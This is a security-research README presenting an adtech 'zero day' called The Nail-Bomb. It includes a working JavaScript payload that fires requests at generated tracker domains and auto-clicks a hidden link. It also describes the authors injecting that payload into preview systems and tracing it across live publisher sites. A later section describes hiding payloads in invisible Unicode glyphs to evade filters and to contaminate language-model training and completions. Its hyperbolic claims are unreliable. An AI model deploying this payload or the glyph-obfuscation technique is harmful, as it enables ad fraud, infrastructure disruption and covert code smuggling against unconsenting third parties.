# The Nail-Bomb  
## A Protocol-Scale Adtech Zero Day via Preview Injection, Trust Recursion, and Glyph-Level Propagation

> Published by **No.Mad Research**, a division of No.Mad Project  
> Authors: JuanG (Tech Researcher) & Bort (Independent Security Auditor, CH)

---

### 📌 Summary

The Nail-Bomb is a low-tech, high-impact exploit that exposes a protocol-grade zero day in the modern adtech ecosystem. What began as a benign JavaScript injection through a preview environment escalated into a scalable, trust-based attack vector. Ultimately, it evolved into a cognitive threat with potential glyph-level propagation across developer tooling and model-based systems.

This repository contains:
- A full technical whitepaper (`README.md`)
- Reproducible proof-of-concept payloads
- Ongoing research logs on glyph-based contamination
- Strategic implications for adtech infrastructure, DSPs, and attribution systems

This is not malware. It is an epistemic artifact revealing ontological negligence across interconnected digital systems.

---

### ⚠️ Notice

This research is published strictly for educational and defensive infrastructure auditing purposes.  
It does not endorse, support, or facilitate misuse of the included technical methodologies.

---
# THE NAIL-BOMB  
## A Protocol-Scale Adtech Zero Day Engineered from Trust, Preview Logic, and Metric Recursion

**Authors:**  
- **Bort** — System Engineer & Independent Security Auditor (Switzerland)  
- **Juan González** — Technical Researcher, Partner & CTO at No.Mad Project

---

## Abstract

This report details the architecture, exploitation, and systemic implications of *The Nail-Bomb*, a low-tech, high-impact exploit vector operating within modern adtech infrastructure. Originating from a misused preview environment, the Nail-Bomb operates not through privilege escalation or malware, but by exploiting fundamental misbeliefs in trust delegation, script sanitation, and creative propagation.

The later discovery of glyph-based logic embedding and language model contamination marked a shift from code-level to cognitive-level propagation, rendering the exploit both untraceable and ontologically viral.

---

## 1. Hypothesis

A minimally obfuscated script injected through adtech preview infrastructure can:

1. Pass unmodified into production ad serving environments.
2. Propagate across networks using real user traffic as distributed amplification.
3. Utilize glyph-based logic to remain obscured and bypass MIME validation.
4. Contaminate cognitive infrastructures such as web scrapers and LLMs.
5. Scale autonomously via developer ingestion and symbolic pattern repetition.

---

## 2. Background

Ad preview systems are assumed to be inert: local QA utilities without reach into production. In reality, these environments expose live creative code, accept non-sanitized parameters, and often mirror or directly transit to production systems via configuration misalignment.

---

## 3. Discovery: Entry via Preview Injection

During a forensic audit, **Bort** identified a vulnerable VPAID preview interface where a `token` parameter passed base64-encoded creative metadata directly into the DOM via innerHTML. Exploiting this oversight, he injected an active JavaScript payload inside the preview environment.

**Tasks Performed by Bort:**
- Reverse engineered VPAID creative loader
- Identified unsafe DOM injection vector
- Injected entropy-based URL generator with synthetic branching
- Probed DSP and CDN endpoints for redirect and MIME misvalidation

---

## 3.1. Field Validation: From Preview to Production

**Juan González** initiated a multistage OSINT-based traffic tracing campaign. By monitoring known publishers and parsing creative delivery metadata, he confirmed:

- Infected creatives rendered live across dozens of publisher sites.
- Payload-bearing creatives survived multiple DSP-level MIME type verifications.
- Scripts executed inside trusted programmatic marketplaces without detection.

**Tasks Performed by Juan González:**
- Indexed public and semi-private CDN endpoints via campaign tracebacks
- Monitored and recorded behavioral anomalies in ad rendering and site load performance
- Mapped injection propagation from QA preview to active CPM delivery
- Traced script fingerprint propagation through three major programmatic exchanges

---

## 4. Payload Design

```javascript
(function(){
  const qp = new URLSearchParams(window.location.search);
  const seed = qp.get("ad_url") || "";
  const base = "abcdefghijklmnopqrstuvwxyz0123456789";
  let entropy = 0;
  for (let i = 0; i < seed.length; i++) {
    entropy += seed.charCodeAt(i) * (i + 13);
  }

  const branches = [];
  for (let j = 0; j < 5; j++) {
    let sub = '';
    for (let i = 0; i < 10; i++) {
      sub += base[(entropy + i * j + j * 7) % base.length];
    }
    branches.push(`https://${sub[0]}${sub[3]}-cdn.${sub[5]}trk.${sub[2]}.biz/${sub}`);
  }

  for (let url of branches) {
    fetch(url);
  }

  const link = document.createElement('a');
  link.href = seed;
  link.style.display = 'none';
  document.body.appendChild(link);
  link.click();
})();
```

---

## 5. Weaponization and Amplification

Each infected creative turned users into organic emitters of synthetic traffic:
- DNS resolutions multiplied per user
- Back-end logs polluted with spoofed CDN activity
- Verification APIs overwhelmed
- Attribution systems rendered blind

---

## 6. Cross-Network Devastation

Via programmatic delivery, creatives crossed vendor boundaries. Company A's preview system became Company B's infrastructure poison — generating:
- Rate-limit spikes
- Traffic overloads
- False fraud triggers
- Budget leakage
- Attribution collapse

---

## 7. Simulation Collapse Fields

1. **Signal Poisoning**: Fraud-free traffic, false engagement signals
2. **Attribution Failure**: Real paths diverged from tracked metrics
3. **Budget Drain**: CPM/CPV charges incurred from synthetic burst load
4. **Infrastructure Stress**: Low-tier CDNs crashed under recursive request chains

---

## 7.1. Ongoing Investigation: Glyph-Level Infection & Cognitive Contagion

The breakthrough came when the Nail-Bomb's payload was encoded using symbolic entropy and unicode glyphs. Bort experimented with invisible characters (`⁠`, `᠎`, `‏`, `︀`) embedded in logic operators. These characters:
- Evaded detection by sandbox filters
- Were ingested by open-source dev platforms
- Triggered LLM ingestion and reproduction in training and inference cycles

### Preliminary Findings:
A non-executable payload that replicated across:
- Developer forums
- Code refactoring tools
- Language model completions

### This may mark the transition:
From *exploit* → to *cognitive virus*.

Further analysis is underway to determine the full extent of contamination vectors. The potential for glyph-based payloads to infiltrate model inference and completion cycles across developer ecosystems remains under active scrutiny by both authors.

---

## 8. The Final Statement

No malware.  
No server access.  
Just assumptions turned into a recursive weapons system.

The Nail-Bomb is not a script.  
It is a **reflection of systemic negligence**, now reassembled into an untraceable glyph.

Wherever text flows, it can survive.  
Wherever logic is replicated, it can re-emerge.

This is no longer preview QA.  
This is protocol collapse, distributed through belief.


---

 

## 👤 About the Authors

**JuanG**  
Partner & CTO at [No.Mad Project](https://www.no-madproject.com), a creative technology and advertising firm focused on immersive digital experiences. At No.Mad, Juan leads product development and creative innovation across adtech-integrated environments. His background includes large-scale campaign delivery systems and the architecture of next-generation creative logic.

His role in *The Nail-Bomb* involved OSINT mapping, pattern analysis, and field validation across publisher and programmatic ecosystems — bridging practical production knowledge with emergent signal analysis.

**Bort**  
Independent Security Engineer based in Switzerland. Bort specializes in protocol-layer audit logic, creative script delivery manipulation, and glyph-level symbolic payload design. He reverse-engineered the VPAID loader paths, exploited unsanitized token logic, and embedded recursive entropy generators within adtech preview environments. He prefers vectors that hide in belief rather than code.

📧 [research@no-madproject.com](mailto:research@no-madproject.com)
